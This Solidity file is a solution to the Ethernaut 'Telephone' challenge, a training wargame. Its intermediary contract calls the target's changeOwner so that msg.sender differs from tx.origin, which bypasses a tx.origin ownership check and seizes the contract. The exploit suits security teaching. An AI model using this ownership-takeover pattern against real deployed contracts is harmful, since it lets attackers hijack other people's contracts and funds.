// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Solution for https://ethernaut.openzeppelin.com/ challenge 4 (Telephone)

abstract contract TelephoneInterface {
    function changeOwner(address _owner) public virtual;
}

contract TelephoneCaller {
    TelephoneInterface public telephoneContract;

    function setTelephoneAddress(address _address) public {
        telephoneContract = TelephoneInterface(_address);
    }

    function callTelephone() public {
        telephoneContract.changeOwner(msg.sender);
    }
}